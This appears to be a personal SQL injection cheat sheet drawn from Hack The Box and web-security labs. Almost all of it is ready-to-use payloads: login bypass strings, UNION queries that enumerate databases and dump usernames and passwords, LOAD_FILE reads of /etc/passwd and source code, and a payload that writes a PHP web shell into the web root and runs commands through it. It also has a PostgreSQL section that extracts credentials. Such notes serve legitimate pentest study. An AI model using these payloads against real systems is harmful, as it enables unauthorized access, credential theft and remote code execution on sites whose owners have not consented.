# Sql injection

## Test is website is vulnerable to SQL injection

Try one of these

```
  '
  "
```

## Authentication Bybass

NOTE: when using comment double dash is not enought, either use double dash with space `-- ` or use additions dash `-- -` for comment to work properly.

`' OR 1=1;-- ` 

`' OR 1=1;-- -`

`' OR '1'='1;-- -`

If you know username 

`admin' OR 1 = 1;-- `

`addmin')-- `

`' or 1=1 and id=5)-- `

## Union Attack

A UNION statement can only operate on SELECT statements with an equal number of columns. For example, if we attempt to UNION two queries that have results with a different number of columns, we get the following error:

`ERROR 1222 (21000): The used SELECT statements have a different number of columns`

### Find number of colums

#### Using UNION

we can use any string as our junk data, and the query will return the string as its output for that column. If we UNION with the string "junk", the SELECT query would be SELECT "junk" from passwords, which will always return junk. We can also use numbers. For example, the query SELECT 1 from passwords will always return 1 as the output.

Note: When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.

Tip: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

`0 UNION SELECT 1,2`

`0 UNION SELECT 'first','second'`

`0 UNION SELECT NULL,NULL`

Other examples

`UNION SELECT username, 2, 3, 4 from passwords-- '`

### Using ORDER 

keepn on increase number 1 until we dont see result meaning that number of columns dont exist

`' order by 1-- -`

### Get Database name

Get current database name using by webapp

`0 UNION SELECT 1,2,database()`

List all database names

`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`

You can query directly using dot syntax without switching database

`SELECT * FROM my_database.users;`

### Get Tables name

`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`

`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`

### Get Columns name

`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`

`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`

### Dump Data / Get username and password

`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`

`cn' UNION select 1, username, password, 4 from dev.credentials-- -`

### Find DBA user

`cn' UNION SELECT 1, user(), 3, 4-- -`

### Find user privilage

`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -`

`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`

Only show privilage our our current root user

- Look for FILE permission, if user have FILE permission then user can read/write file in the system

`cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`

See which folder have mysql have access to 

- if value is empty then we have read/write access to any location on server. or it will have path where user have read/write permission

`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`

### DB Enemurations  (Not so important coz you can find DB, table, coulums names using above method but just know you can do like this manually as well)

`admin123' UNION SELECT 1,2,3;-- `

`admin123' UNION SELECT 1,2,3 where database() like 's%';--`

`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`

`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--`

`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`

`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`

`admin123' UNION SELECT 1,2,3 from users where username like 'a%`

`admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%`

## Load File / Read File form server

Read contents of file if user have FILE privilege

`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`

You can also try to read source code. However, the page ends up rendering the HTML code within the browser. The HTML source can be viewed by hitting [Ctrl + U].

`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`

## Write File to server

`cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`

writing php shell code

`cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`

execture command eg

`127.0.0.1/shell.php?0=id`
`127.0.0.1/shell.php?0=ls /`
`127.0.0.1/shell.php?0=<any commands>`

# HTB Cheetsheet

## MySQL

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
| **Columns** |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |

## MySQL Operator Precedence
* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

## SQL Injection
| **Payload**   | **Description**   |
| --------------|-------------------|
| **Auth Bypass** |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
| **Union Injection** |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |

POST GRES

get current user

/filter?category=111Accessories' union SELECT NULL, current_user--

get current database

/filter?category=111Accessories' union SELECT NULL, current_database()--


category=Accessories' union SELECT NULL, string_agg(tablename, ', ') FROM pg_catalog.pg_tables--

category=Accessories' union SELECT NULL, tablename FROM pg_catalog.pg_tables--


get all tables name 

union SELECT NULL, tablename FROM pg_catalog.pg_tables where schemaname='public'

get all columns name
union SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'users_pcmsub' AND table_schema = 'public'--

get username password

category=111Accessories' union SELECT username_emyvoc, password_glhxzi FROM users_pcmsub--

